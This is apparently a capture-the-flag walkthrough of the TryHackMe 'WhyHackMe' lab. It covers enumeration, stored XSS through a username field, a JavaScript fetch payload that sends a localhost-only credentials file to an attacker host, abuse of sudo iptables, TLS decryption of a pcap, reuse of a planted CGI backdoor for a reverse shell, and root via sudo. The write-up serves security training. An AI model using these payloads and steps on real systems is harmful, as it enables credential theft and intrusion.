# WhyHackMe

Room Link: ![https://tryhackme.com/room/whyhackme](https://tryhackme.com/room/whyhackme)

## Enumeration

Lets start off with a simple nmap scan:
```
kali@kali:~$ sudo nmap MACHINE_IP
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-17 02:36 EST
Nmap scan report for MACHINE_IP
Host is up (0.00014s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
80/tcp    open     http
41312/tcp filtered unknown
```
Then a service scan:
```
kali@kali:~$ sudo nmap -sCV -p 21,22,80 MACHINE_IP
Nmap scan report for MACHINE_IP
Host is up (0.000091s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             358 Feb 16 10:02 conv.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.133.71.33
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 70:53:d1:8e:33:af:cd:b1:ec:90:1b:6e:dc:ec:c3:2b (RSA)
|   256 08:a2:49:c1:c3:70:31:9b:f0:f9:a6:68:27:fb:82:b8 (ECDSA)
|_  256 93:50:d5:98:0f:0f:70:64:ab:66:be:5e:dc:f9:29:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Welcome! 
|_http-server-header: Apache/2.4.41 (Ubuntu)
41312/tcp filtered unknown
```

When we see the output above we can easily rule out chances of SSH being vulnerable because of its version number.

### Port 21:-
From above we know that ftp has anonymous access enabled. So we log in to the ftp server:
```
kali@kali:~$ ftp MACHINE_IP
Connected to MACHINE_IP.
220 (vsFTPd 3.0.3)
Name (MACHINE_IP:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
257 "/" is the current directory
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        118          4096 Feb 16 10:12 .
drwxr-xr-x    2 0        118          4096 Feb 16 10:12 ..
-rw-r--r--    1 0        0             358 Feb 16 10:02 update.txt
226 Directory send OK.
ftp> get update.txt 
local: update.txt remote: update.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for update.txt (358 bytes).
226 Transfer complete.
358 bytes received in 0.00 secs (11.0134 MB/s)
```
We retreive the update.txt and read its contents:
```
kali@kali:~$ cat update.txt 
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except for me or people with access to the common account. 
- admin
```
Key takeaways:
1. The /dir/pass.txt file is only accessible by localhost(127.0.0.1).

### Port 80:-
When we visit the website we see a blog and it has a comment section, but to comment you need to be logged in. 
We also see that admin says he checks the comment section within a minute of someone commenting, so we keep this in mind.

We fuzz the webapp for other php files apart from blog and login. 
```
kali@kali:~$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://MACHINE_IP/FUZZ.php"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://MACHINE_IP/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

register                [Status: 200, Size: 641, Words: 36, Lines: 23]
blog                    [Status: 200, Size: 3318, Words: 440, Lines: 23]
logout                  [Status: 200, Size: 0, Words: 1, Lines: 1]
index                   [Status: 200, Size: 679, Words: 67, Lines: 25]
login                   [Status: 200, Size: 519, Words: 45, Lines: 21]
```
So we visit these files and we see that we can register an account. So lets use any username and password like "test:test" to register.
And then we go to login.php and login using our created account.

Now we see a comment box in /blog.php and we can comment anything we want to and there is also an option to delete your comments.
We try basic XSS and enter `<script>alert(1)</script>` as the comment but we see that the input is being sanitized and thus we can't perform HTML Injecion or XSS using the comment box.

But we can see that our username is also being displayed in the comments. Since we can control a user input that is being reflected on a page we must check our username also for input validation.
So lets logout by clicking on the link in the login.php page and register another account with the name `<script>alert(1)</script>` and any password.
We see that our account has been registered, so we login and comment any word.
We see that our username isn't being sanitized so we can perform XSS using our username.
```
POC: <script> alert('XSS'); </script>
```

The first thought that comes to someones mind when they come across XSS is cookie stealing but before we proceed, we check our PHPSESSID in dev tools of our browser.
We see that httponly flag is set to true. If this flag is set to true it means any scripting language like javascript can't access the cookie. For example, executing document.cookie in console won't give you any result.
So cookie stealing or session hijacking isn't an option.

We already know from update.txt that there are creds to a new account in /dir/pass.txt which only localhost can access.
We try to access /dir/pass.txt but we get a 403 response code.
```
kali@kali:~$ curl "http://MACHINE_IP/dir/pass.txt"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at MACHINE_IP Port 80</address>
</body></html>
```
We also know that the admin at localhost checks every comment. (You know where this is going).
We know that admin is at localhost by reading the update.txt where he says **"this file is only accessible by localhost(127.0.0.1), so nobody else can view it except for me or people with access to the common account"**.

## Exploitation

We now know that we need to exfiltrate /dir/pass.txt using javascript.
After a bit of researching we learn how to post data using javascript.
So the malicious javascript for retrieving pass.txt is:
```js
<script>fetch("http://127.0.0.1/dir/pass.txt").then(x => x.text()).then(y => fetch("http://<ATTACKER_IP>:<ATTACKER_PORT>", {method: "POST", body:y}));</script>
```
Note: The above is just a variation of many different data exfil payloads.

We make a account with the exploit code as username and some weak password like pass123.
Then we visit blog.php and comment and wait for a minute while listening on the port we entered in the javascript code. 

This javascript code will not be executed on our browser as it is a Cross-Origin Request(webpage trying to access your localhost) and it will be blocked.
But when the admin visits this page the javascript code will execute(since admin is at localhost) and admin can access pass.txt too.

We start a listner at the port we specified in the malicious javascript:
```
kali@kali:~$ nc -lnvp 8888
listening on [any] 8888 ...
```
And in a minute we get a post request with the contents of pass.txt on our listner.
```
kali@kali:~$ nc -lnvp 8888                                 
listening on [any] 8888 ...
connect to [10.133.71.33] from (UNKNOWN) [MACHINE_IP] 47576
POST / HTTP/1.1
Host: 10.133.71.33:8888
Connection: keep-alive
Content-Length: 32
Origin: http://127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/71.0.3542.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: http://127.0.0.1/index.php
Accept-Encoding: gzip, deflate

<REDACTED>
```

Note: If we use `http://<MACHINE_IP>/dir/pass.txt` in place of `http://127.0.0.1/dir/pass.txt` in malicious javascript we don't get any callback on our listner.

This is because only 127.0.0.1 can access it, nothing apart it can. For brief explanation see the last section of the walkthrough.

Now we have a username and password so we can login to the machine using SSH.
```
kali@kali:~$ ssh jack@<MACHINE_IP>
jack@<MACHINE_IP>'s password:
jack@ubuntu:~$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
jack@ubuntu:~$ 
```

## Escalation:

After some initial enumeration we see a note from admin at /opt/urgent.txt: 
```
jack@ubuntu:~$ cat /opt/urgent.txt
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
-admin
```
Upon checking out the `/usr/lib/cgi-bin/` we realise that we don't have the perms to list the directory.
We spot a capture.pcap file in /opt too.
We copy the pcap file to our attacker machine and analyse it which leads is to realize encrypted traffic between in and out of port 41312.

So we look into existing communications by:
```
jack@ubuntu:~$ ss -tulpn
tcp     LISTEN      0       4096        0.0.0.0:41312
...
```

From above we see that there is something running on port 41312 and according to admin it is a backdoor and he said he had blocked access to it using a firewall.
Even we can't visit the server.

By checking our sudo permissions `sudo -l`:-
```
jack@ubuntu:~$ sudo -l
[sudo] password for jack: 
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```
We can run iptables as root. Good.
We now allow inbound connections on port 41312 by:
```
jack@ubuntu:~$ sudo iptables -I INPUT -p tcp -m tcp --dport 41312 -j ACCEPT
```
Or we can delete the rule admin placed too, your wish.

Now we visit this port on our web browser but we see that https is enabled.
Upon accepting the risk and continuing we see a Forbidden page. Upone fuzzing its directories we discover `cgi-bin`.
```
kali@kali:~$ ffuf -w /usr/share/wordlists/dirb/big.txt -u 'https://10.10.80.133:41312/FUZZ' -k

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.80.133:41312/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10]
cgi-bin/                [Status: 403, Size: 280, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 4879 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```
But upone further fuzzing the `cgi-bin` we don't find anything.

So we read /etc/apache2/sites-available/000-default.conf, then we see that the attacker has used AES256-SHA.
More info: https://ciphersuite.info/cs/TLS_RSA_WITH_AES_256_CBC_SHA/. 
```
Listen 41312
<VirtualHost *:41312>
        ServerName www.example.com
        ServerAdmin webmaster@localhost
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        SSLEngine on
        SSLCipherSuite AES256-SHA
        SSLProtocol -all +TLSv1.2
        SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
        SSLCertificateKeyFile /etc/apache2/certs/apache.key
        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        AddHandler cgi-script .cgi .py .pl
        DocumentRoot /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride All 
                Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>
</VirtualHost>
```
Since the RSA Key Exchange is used we can decrypt the traffic using the server private key.

We then see that the private key /etc/apache2/certs/apache.key is world readable. Also we see info related to the cgi scripts.

Pretty bad, but good for us because now we can see what the attacker was doing by decrypting the encrypted packets using wireshark on our attacker machine.

Copy the private key to attacker machine and to decrypt and follow along:
1. Open the pcap file in wireshark and then go to Edit -> Preferences.
2. Under Protocols search for TLS/SSL and select it
3. Then we edit RSA keys list by clicking on the edit button next to RSA keys list.
4. Click on the + icon and fill in the details.
5. IP address is 10.133.71.33, Port is 41312, Protocol is http and under key file specify the location of private key on your attacker machine.
6. The click on ok and ok again.
7. Now you can see the http requests in plaintext.

We see that the attacker visits `/cgi-bin/5UP3r53Cr37.py` with key, iv and cmd as query params.
Getting the URI for the backdoor to work properly.
```
/cgi-bin/5UP3r53Cr37.py?key=<KEY>&iv=<IV>&cmd=<COMMAND>
```

We then get a reverse shell by exploiting the attackers' backdoor.

We see that we are a part of a group named h4ck3d and we execute `sudo -l`:
```
www-data@ubuntu:/var/www/web$ id
uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
www-data@ubuntu:/var/www/web$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

Yes now we can execute any command as root without a password.

Now we just escalate our privileges by `sudo bash`.
```
www-data@ubuntu:~$ sudo bash
root@ubuntu:/home/jack# id
uid=0(root) gid=0(root) groups=0(root)
```

### 403 Forbidden:

Taking a look at apache log file we see that when we use `http://<MACHINE_IP>/dir/pass.txt` in place of `http://127.0.0.1/dir/pass.txt` in the **malicious javascript** then the server responds with a 403 staus code and thus we dont get any hit on our listner:
```
MACHINE_IP - - [17/Feb/2022:10:19:02 +0000] "GET /dir/pass.txt HTTP/1.1" 403 491 `http://127.0.0.1/index.php` Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/71.0.3542.0 Safari/537.36"
```

## Lessons learned:-

1. Just because we can mitigate SQL Injection by using prepared statements doesn't mean we need not validate user input.
2. We should validate any user input before reflecting it onto a web page.
3. Httponly flag should always be set to true to mitigate attacks like session hijacking/cookie stealing using XSS.
4. Always implement crypto securely.
5. Decrypting HTTPS traffic using wireshark.

Note: If the key exchange was done by DHE or EDHE, then there isn't a way to decrypt traffic even though you have the server's private key as far as I know, please enlighten me on this.

## Extra(Do it if you want to??):-

We see that we are not able to delete /var/www/web even though we are root because the immutable bit is set and it can be checked by `lsattr`.

So we remove immutable bits wherever the attacker placed them by `chattr -i <FILE_NAME>`.

We see that the group h4ck3d is a backdoor to execute commands as root by checking out /etc/sudoers.(Remove this group)

Check all files in /etc/apache2 and remove the backdoor the attacker used. (The APACHE_RUN_GROUP is set to h4ck3d)

Lastly sanitize inputs.

## Unintended Privesc

Please checkout jaxafed's ![writeup](https://jaxafed.github.io/posts/tryhackme-whyhackme/#alternative-way-to-get-root-flag) for this amazing method. I won't be fixing it, since it is a really good finding.
